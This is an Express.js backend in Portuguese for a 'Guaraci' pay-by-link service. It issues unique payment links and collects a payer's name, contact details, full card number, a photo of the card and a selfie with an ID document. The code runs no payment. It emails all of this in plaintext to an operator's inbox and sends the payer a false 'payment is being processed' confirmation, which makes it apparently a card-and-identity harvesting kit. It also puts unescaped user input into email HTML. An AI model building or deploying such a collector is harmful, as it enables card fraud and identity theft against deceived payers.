require('dotenv').config();
const express = require('express');
const multer = require('multer');
const { v4: uuidv4, validate: uuidValidate } = require('uuid');
const rateLimit = require('express-rate-limit');
const nodemailer = require('nodemailer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// Rate Limiting (5 requisições/minuto por IP)
const limiter = rateLimit({
    windowMs: 60 * 1000,
    max: 5,
    message: 'Muitas requisições. Tente novamente mais tarde.'
});
app.use(limiter);

// Configuração do Multer (upload de imagens)
const storage = multer.memoryStorage(); // Armazena na memória ao invés de disco

const upload = multer({
    storage: storage,
    fileFilter: (req, file, cb) => {
        if (file.mimetype.startsWith('image/')) cb(null, true);
        else cb(new Error('Apenas imagens são permitidas!'), false);
    },
    limits: { fileSize: 5 * 1024 * 1024 }
});

// Configuração do Nodemailer (envio de e-mails)
const transporter = nodemailer.createTransport({
    service: 'gmail',
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
    },
    tls: {
        rejectUnauthorized: true,
    }
});

// Rota para gerar links únicos
app.post('/api/generate-link', (req, res) => {
    const uniqueId = uuidv4();
    res.json({
        link: uniqueId,
        fullUrl: `${process.env.FRONTEND_URL || 'https://seu-frontend.vercel.app'}/pagamento/${uniqueId}`
    });
});

// Rota para processar pagamento
app.post('/api/submit-payment', upload.fields([
    { name: 'fotoCartao', maxCount: 1 },
    { name: 'selfieDocumento', maxCount: 1 }
    ]), async (req, res) => {
    try {
        const { nome, email, telefone, cartao, linkId } = req.body;

        // Validação do UUID do link
        if (!uuidValidate(linkId)) {
        return res.status(400).json({ error: 'Link inválido!' });
        }

        // Validação dos dados (Zod opcional)
        if (!nome || !email || !telefone || !cartao) {
        return res.status(400).json({ error: 'Dados incompletos!' });
        }

        const generateClientEmailHTML = (nome, linkId) => {
            return `
            <!DOCTYPE html>
            <html>
            <head>
                <meta name="x-apple-disable-message-reformatting">
                <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Pagamento em Processamento - Guaraci</title>
                <style>
                    body {
                        font-family: 'Arial', sans-serif;
                        line-height: 1.6;
                        color: #333333;
                        margin: 0;
                        padding: 0;
                        background-color: #f9f9f9;
                    }
                    .container {
                        max-width: 600px;
                        margin: 0 auto;
                        padding: 20px;
                    }
                    .header {
                        background-color: #0063F7;
                        padding: 30px 20px;
                        text-align: center;
                        border-radius: 16px 16px 0 0;
                    }
                    .header h1 {
                        color: #ffffff;
                        margin: 0;
                        font-size: 28px;
                    }
                    .header p {
                        color: rgba(255, 255, 255, 0.9);
                        margin: 5px 0 0;
                        font-size: 16px;
                    }
                    .content {
                        background-color: #ffffff;
                        padding: 30px;
                        border-radius: 0 0 16px 16px;
                        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
                    }
                    .title {
                        color: #0063F7;
                        text-align: center;
                        font-size: 24px;
                        margin-bottom: 25px;
                    }
                    .button {
                        display: inline-block;
                        padding: 14px 28px;
                        background-color: #0063F7;
                        color: #ffffff;
                        text-decoration: none;
                        border-radius: 8px;
                        font-weight: bold;
                        margin: 20px 0;
                        text-align: center;
                    }
                    .divider {
                        border-top: 1px solid #eeeeee;
                        margin: 25px 0;
                    }
                    .footer {
                        text-align: center;
                        color: #999999;
                        font-size: 12px;
                        margin-top: 30px;
                    }
                    .highlight-box {
                        background-color: #f5f9ff;
                        border-left: 4px solid #0063F7;
                        padding: 15px;
                        margin: 20px 0;
                        border-radius: 0 8px 8px 0;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>Guaraci</h1>
                        <p>Pagamento via link</p>
                    </div>
                    
                    <div class="content">
                        <h2 class="title">Pagamento em Processamento</h2>
                        
                        <p>Olá, {{nome}}!</p>
                        
                        <p>Recebemos seu pagamento e ele está sendo processado pela nossa equipe. Você receberá uma confirmação assim que o processo for concluído.</p>
                        
                        <div class="highlight-box">
                            <strong>Detalhes do pagamento:</strong>
                            <p>ID da transação: {{linkId}}</p>
                            <p>Data: {{data}}</p>
                        </div>
                        
                        <div class="divider"></div>
                        
                        <p>Caso tenha alguma dúvida, entre em contato conosco respondendo este e-mail ou através dos nossos canais de atendimento.</p>
                        
                        <p>Atenciosamente,<br>
                        <strong>Equipe Guaraci</strong></p>
                        
                        <div class="footer">
                            <p>© 2025 Guaraci. Todos os direitos reservados.</p>
                            <p>
                                <a href="#" style="color: #999999; text-decoration: none;">Política de Privacidade</a> | 
                                <a href="#" style="color: #999999; text-decoration: none;">Termos de Serviço</a>
                            </p>
                        </div>
                    </div>
                </div>
            </body>
            </html>
            `   .replace('{{nome}}', nome)
                .replace('{{linkId}}', linkId)
                .replace('{{data}}', new Date().toLocaleString());
        };

        const generateAdminEmailHTML = (nome, email, telefone, cartao, linkId) => {
            return `
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Novo Pagamento Recebido - Guaraci</title>
                <style>
                    /* Mesmos estilos do template anterior */
                    .data-table {
                        width: 100%;
                        border-collapse: collapse;
                        margin: 20px 0;
                    }
                    .data-table th {
                        background-color: #0063F7;
                        color: white;
                        padding: 10px;
                        text-align: left;
                    }
                    .data-table td {
                        padding: 10px;
                        border-bottom: 1px solid #eeeeee;
                    }
                    .image-preview {
                        max-width: 200px;
                        margin: 10px 0;
                        border: 1px solid #ddd;
                        border-radius: 4px;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>Guaraci</h1>
                        <p>Pagamento via link</p>
                    </div>
                    
                    <div class="content">
                        <h2 class="title">Novo Pagamento Recebido</h2>
                        
                        <p>Um novo pagamento foi submetido através do sistema de links. Seguem os detalhes:</p>
                        
                        <table class="data-table">
                            <tr>
                                <th colspan="2">Dados do Cliente</th>
                            </tr>
                            <tr>
                                <td><strong>Nome:</strong></td>
                                <td>{{nome}}</td>
                            </tr>
                            <tr>
                                <td><strong>E-mail:</strong></td>
                                <td>{{email}}</td>
                            </tr>
                            <tr>
                                <td><strong>Telefone:</strong></td>
                                <td>{{telefone}}</td>
                            </tr>
                            <tr>
                                <td><strong>Cartão:</strong></td>
                                <td>{{cartao}}</td>
                            </tr>
                            <tr>
                                <td><strong>ID do Link:</strong></td>
                                <td>{{linkId}}</td>
                            </tr>
                            <tr>
                                <td><strong>Data/Hora:</strong></td>
                                <td>{{data}}</td>
                            </tr>
                        </table>
                        
                        <div class="divider"></div>
                        
                        <p><strong>Documentos anexados:</strong></p>
                        <p>1. Foto do cartão</p>
                        <p>2. Selfie com documento</p>
                        
                        <div class="footer">
                            <p>© 2025 Guaraci. Todos os direitos reservados.</p>
                        </div>
                    </div>
                </div>
            </body>
            </html>
                `.replace(/{{nome}}/g, nome)
                .replace('{{email}}', email)
                .replace('{{telefone}}', telefone)
                .replace('{{cartao}}', cartao)
                .replace('{{linkId}}', linkId)
                .replace('{{data}}', new Date().toLocaleString());
        };

        // Envio de e-mails
        await Promise.all([
            // E-mail para o cliente
            transporter.sendMail({
                from: `"Guaraci Pagamentos" <${process.env.EMAIL_USER}>`,
                to: email,
                subject: 'Seu pagamento está em processamento',
                html: generateClientEmailHTML(nome, linkId),
                text: `Olá ${nome},\n\nSeu pagamento está sendo processado.\nID: ${linkId}\n\nAtenciosamente,\nEquipe Guaraci`
            }),

            // E-mail para o responsável
            transporter.sendMail({
                from: `"Guaraci Pagamentos" <${process.env.EMAIL_USER}>`,
                to: process.env.RESPONSIBLE_EMAIL,
                subject: `Novo pagamento de ${nome}`,
                html: generateAdminEmailHTML(nome, email, telefone, cartao, linkId),
                attachments: [
                    {
                        filename: 'foto_cartao.jpg',
                        content: req.files.fotoCartao[0].buffer
                    },
                    {
                        filename: 'selfie_documento.jpg',
                        content: req.files.selfieDocumento[0].buffer
                    }
                ]
            })
        ]);

        // Limpar arquivos após 1 hora (opcional)
        setTimeout(() => {
            req.files.fotoCartao[0].buffer = null;
            req.files.selfieDocumento[0].buffer = null;
        }, 3600000);

        res.json({ success: true });
    } catch (error) {
        console.error('Erro:', error);
        res.status(500).json({ error: 'Erro no servidor.' });
    }
});

// Rota de health check para o Vercel
app.get('/', (req, res) => {
    res.status(200).json({
        status: 'API operacional',
        version: '1.0.0'
    });
});

// Rota de teste da API
app.get('/api/status', (req, res) => {
    res.json({
        success: true,
        message: 'API está funcionando corretamente',
        timestamp: new Date().toISOString()
    });
});

// Iniciar servidor
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`Backend rodando em http://localhost:${PORT}`))
    .on('error', (err) => {
        console.error('Erro ao iniciar o servidor:', err);
    });
